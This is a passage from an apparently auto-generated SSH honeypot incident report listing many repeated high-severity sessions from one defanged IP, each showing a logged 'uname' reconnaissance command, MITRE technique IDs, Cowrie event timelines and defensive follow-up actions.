| `2026-08-20 19:26:43` | `cowrie.log.closed` |
| `2026-08-20 19:26:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8071f0bd5a34

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:34` | `cowrie.session.connect` |
| `2026-08-20 19:26:34` | `cowrie.client.version` |
| `2026-08-20 19:26:34` | `cowrie.client.kex` |
| `2026-08-20 19:26:38` | `cowrie.login.success` |
| `2026-08-20 19:26:39` | `cowrie.session.params` |
| `2026-08-20 19:26:39` | `cowrie.command.input` |
| `2026-08-20 19:26:43` | `cowrie.log.closed` |
| `2026-08-20 19:26:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18240067fb76

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:34` | `cowrie.session.connect` |
| `2026-08-20 19:26:34` | `cowrie.client.version` |
| `2026-08-20 19:26:34` | `cowrie.client.kex` |
| `2026-08-20 19:26:38` | `cowrie.login.success` |
| `2026-08-20 19:26:41` | `cowrie.session.params` |
| `2026-08-20 19:26:41` | `cowrie.command.input` |
| `2026-08-20 19:26:44` | `cowrie.log.closed` |
| `2026-08-20 19:26:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a8fea022d2b

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:34` | `cowrie.session.connect` |
| `2026-08-20 19:26:34` | `cowrie.client.version` |
| `2026-08-20 19:26:35` | `cowrie.client.kex` |
| `2026-08-20 19:26:38` | `cowrie.login.success` |
| `2026-08-20 19:26:42` | `cowrie.session.params` |
| `2026-08-20 19:26:42` | `cowrie.command.input` |
| `2026-08-20 19:26:44` | `cowrie.log.closed` |
| `2026-08-20 19:26:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0136d66b070

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:35` | `cowrie.session.connect` |
| `2026-08-20 19:26:35` | `cowrie.client.version` |
| `2026-08-20 19:26:35` | `cowrie.client.kex` |
| `2026-08-20 19:26:54` | `cowrie.login.success` |
| `2026-08-20 19:26:58` | `cowrie.session.params` |
| `2026-08-20 19:26:58` | `cowrie.command.input` |
| `2026-08-20 19:27:00` | `cowrie.log.closed` |
| `2026-08-20 19:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76460a6c00fb

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:36` | `cowrie.session.connect` |
| `2026-08-20 19:26:36` | `cowrie.client.version` |
| `2026-08-20 19:26:37` | `cowrie.client.kex` |
| `2026-08-20 19:26:40` | `cowrie.login.success` |
| `2026-08-20 19:26:44` | `cowrie.session.params` |
| `2026-08-20 19:26:44` | `cowrie.command.input` |
| `2026-08-20 19:26:45` | `cowrie.log.closed` |
| `2026-08-20 19:26:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d72126a16051

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:37` | `cowrie.session.connect` |
| `2026-08-20 19:26:37` | `cowrie.client.version` |
| `2026-08-20 19:26:38` | `cowrie.client.kex` |
| `2026-08-20 19:26:43` | `cowrie.login.success` |
| `2026-08-20 19:26:47` | `cowrie.session.params` |
| `2026-08-20 19:26:47` | `cowrie.command.input` |
| `2026-08-20 19:26:49` | `cowrie.log.closed` |
| `2026-08-20 19:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ea5eda55753

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:37` | `cowrie.session.connect` |
| `2026-08-20 19:26:37` | `cowrie.client.version` |
| `2026-08-20 19:26:43` | `cowrie.client.kex` |
| `2026-08-20 19:26:57` | `cowrie.login.success` |
| `2026-08-20 19:27:00` | `cowrie.session.params` |
| `2026-08-20 19:27:00` | `cowrie.command.input` |
| `2026-08-20 19:27:02` | `cowrie.log.closed` |
| `2026-08-20 19:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ca9117ae790

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:37` | `cowrie.session.connect` |
| `2026-08-20 19:26:37` | `cowrie.client.version` |
| `2026-08-20 19:26:38` | `cowrie.client.kex` |
| `2026-08-20 19:26:43` | `cowrie.login.success` |
| `2026-08-20 19:26:45` | `cowrie.session.params` |
| `2026-08-20 19:26:45` | `cowrie.command.input` |
| `2026-08-20 19:26:47` | `cowrie.log.closed` |
| `2026-08-20 19:26:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-406dac1150fd

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 53s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:38` | `cowrie.session.connect` |
| `2026-08-20 19:26:38` | `cowrie.client.version` |
| `2026-08-20 19:27:19` | `cowrie.client.kex` |
| `2026-08-20 19:27:28` | `cowrie.login.success` |
| `2026-08-20 19:27:31` | `cowrie.session.params` |
| `2026-08-20 19:27:31` | `cowrie.command.input` |
| `2026-08-20 19:27:32` | `cowrie.log.closed` |
| `2026-08-20 19:27:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb784938e1cd

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:40` | `cowrie.session.connect` |
| `2026-08-20 19:26:40` | `cowrie.client.version` |
| `2026-08-20 19:26:40` | `cowrie.client.kex` |
| `2026-08-20 19:26:55` | `cowrie.login.success` |
| `2026-08-20 19:26:57` | `cowrie.session.params` |
| `2026-08-20 19:26:57` | `cowrie.command.input` |
| `2026-08-20 19:27:00` | `cowrie.log.closed` |
| `2026-08-20 19:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8015d13b43d

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:28 |
| **Session Duration** | 101s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:40` | `cowrie.session.connect` |
| `2026-08-20 19:26:42` | `cowrie.client.version` |
| `2026-08-20 19:26:53` | `cowrie.client.kex` |
| `2026-08-20 19:27:15` | `cowrie.login.success` |
| `2026-08-20 19:27:22` | `cowrie.session.params` |
| `2026-08-20 19:27:22` | `cowrie.command.input` |
| `2026-08-20 19:28:22` | `cowrie.log.closed` |
| `2026-08-20 19:28:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6a90a8e9188

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:42` | `cowrie.session.connect` |
| `2026-08-20 19:26:43` | `cowrie.client.version` |
| `2026-08-20 19:26:48` | `cowrie.client.kex` |
| `2026-08-20 19:26:57` | `cowrie.login.success` |
| `2026-08-20 19:27:05` | `cowrie.session.params` |
| `2026-08-20 19:27:05` | `cowrie.command.input` |
| `2026-08-20 19:27:09` | `cowrie.log.closed` |
| `2026-08-20 19:27:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20d87ca2126c

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:42` | `cowrie.session.connect` |
| `2026-08-20 19:26:43` | `cowrie.client.version` |
| `2026-08-20 19:26:44` | `cowrie.client.kex` |
| `2026-08-20 19:26:49` | `cowrie.login.success` |
| `2026-08-20 19:27:08` | `cowrie.session.params` |
| `2026-08-20 19:27:08` | `cowrie.command.input` |
| `2026-08-20 19:27:14` | `cowrie.log.closed` |
| `2026-08-20 19:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d0cd0cab1cc

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:42` | `cowrie.session.connect` |
| `2026-08-20 19:26:43` | `cowrie.client.version` |
| `2026-08-20 19:26:44` | `cowrie.client.kex` |
| `2026-08-20 19:26:49` | `cowrie.login.success` |
| `2026-08-20 19:26:51` | `cowrie.session.params` |
| `2026-08-20 19:26:51` | `cowrie.command.input` |
| `2026-08-20 19:26:54` | `cowrie.log.closed` |
| `2026-08-20 19:26:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b61275b0800

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:42` | `cowrie.session.connect` |
| `2026-08-20 19:26:43` | `cowrie.client.version` |
| `2026-08-20 19:26:44` | `cowrie.client.kex` |
| `2026-08-20 19:26:46` | `cowrie.login.success` |
| `2026-08-20 19:26:48` | `cowrie.session.params` |
| `2026-08-20 19:26:48` | `cowrie.command.input` |
| `2026-08-20 19:26:49` | `cowrie.log.closed` |
| `2026-08-20 19:26:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25715800eb01

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:42` | `cowrie.session.connect` |
| `2026-08-20 19:26:43` | `cowrie.client.version` |
| `2026-08-20 19:26:44` | `cowrie.client.kex` |
| `2026-08-20 19:27:02` | `cowrie.login.success` |
| `2026-08-20 19:27:09` | `cowrie.session.params` |
| `2026-08-20 19:27:09` | `cowrie.command.input` |
| `2026-08-20 19:27:11` | `cowrie.log.closed` |
| `2026-08-20 19:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-642aab52d23b

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:44` | `cowrie.session.connect` |
| `2026-08-20 19:26:44` | `cowrie.client.version` |
| `2026-08-20 19:26:45` | `cowrie.client.kex` |
| `2026-08-20 19:26:56` | `cowrie.login.success` |
| `2026-08-20 19:26:59` | `cowrie.session.params` |
| `2026-08-20 19:26:59` | `cowrie.command.input` |
| `2026-08-20 19:27:01` | `cowrie.log.closed` |
| `2026-08-20 19:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1faeeecb1259

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:44` | `cowrie.session.connect` |
| `2026-08-20 19:26:44` | `cowrie.client.version` |
| `2026-08-20 19:26:48` | `cowrie.client.kex` |
| `2026-08-20 19:26:49` | `cowrie.login.success` |
| `2026-08-20 19:26:52` | `cowrie.session.params` |
| `2026-08-20 19:26:52` | `cowrie.command.input` |
| `2026-08-20 19:26:53` | `cowrie.log.closed` |
| `2026-08-20 19:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23ef00dea30c

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:45` | `cowrie.session.connect` |
| `2026-08-20 19:26:45` | `cowrie.client.version` |
| `2026-08-20 19:26:48` | `cowrie.client.kex` |
| `2026-08-20 19:26:54` | `cowrie.login.success` |
| `2026-08-20 19:26:56` | `cowrie.session.params` |
| `2026-08-20 19:26:56` | `cowrie.command.input` |
| `2026-08-20 19:26:57` | `cowrie.log.closed` |
| `2026-08-20 19:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfa8a28e7dcd

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:46` | `cowrie.session.connect` |
| `2026-08-20 19:26:46` | `cowrie.client.version` |
| `2026-08-20 19:26:48` | `cowrie.client.kex` |
| `2026-08-20 19:26:55` | `cowrie.login.success` |
| `2026-08-20 19:27:08` | `cowrie.session.params` |
| `2026-08-20 19:27:08` | `cowrie.command.input` |
| `2026-08-20 19:27:10` | `cowrie.log.closed` |
| `2026-08-20 19:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad132329652a

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:46` | `cowrie.session.connect` |
| `2026-08-20 19:26:46` | `cowrie.client.version` |
| `2026-08-20 19:26:47` | `cowrie.client.kex` |
| `2026-08-20 19:26:49` | `cowrie.login.success` |
| `2026-08-20 19:26:51` | `cowrie.session.params` |
| `2026-08-20 19:26:51` | `cowrie.command.input` |
| `2026-08-20 19:26:53` | `cowrie.log.closed` |
| `2026-08-20 19:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af375b13622e

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:47` | `cowrie.session.connect` |
| `2026-08-20 19:26:48` | `cowrie.client.version` |
| `2026-08-20 19:26:49` | `cowrie.client.kex` |
| `2026-08-20 19:26:52` | `cowrie.login.success` |
| `2026-08-20 19:27:10` | `cowrie.session.params` |
| `2026-08-20 19:27:10` | `cowrie.command.input` |
| `2026-08-20 19:27:13` | `cowrie.log.closed` |
| `2026-08-20 19:27:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee8ed2de6700

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:48` | `cowrie.session.connect` |
| `2026-08-20 19:26:48` | `cowrie.client.version` |
| `2026-08-20 19:26:49` | `cowrie.client.kex` |
| `2026-08-20 19:26:54` | `cowrie.login.success` |
| `2026-08-20 19:26:54` | `cowrie.session.params` |
| `2026-08-20 19:26:54` | `cowrie.command.input` |
| `2026-08-20 19:26:55` | `cowrie.log.closed` |
| `2026-08-20 19:26:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e142aa35adc5

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:48` | `cowrie.session.connect` |
| `2026-08-20 19:26:48` | `cowrie.client.version` |
| `2026-08-20 19:26:49` | `cowrie.client.kex` |
| `2026-08-20 19:26:53` | `cowrie.login.success` |
| `2026-08-20 19:26:55` | `cowrie.session.params` |
| `2026-08-20 19:26:55` | `cowrie.command.input` |
| `2026-08-20 19:26:56` | `cowrie.log.closed` |
| `2026-08-20 19:26:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-965a6010268f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:49` | `cowrie.session.connect` |
| `2026-08-20 19:26:49` | `cowrie.client.version` |
| `2026-08-20 19:26:51` | `cowrie.client.kex` |
| `2026-08-20 19:27:10` | `cowrie.login.success` |
| `2026-08-20 19:27:14` | `cowrie.session.params` |
| `2026-08-20 19:27:14` | `cowrie.command.input` |
| `2026-08-20 19:27:15` | `cowrie.log.closed` |
| `2026-08-20 19:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-631f2c2dde43

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

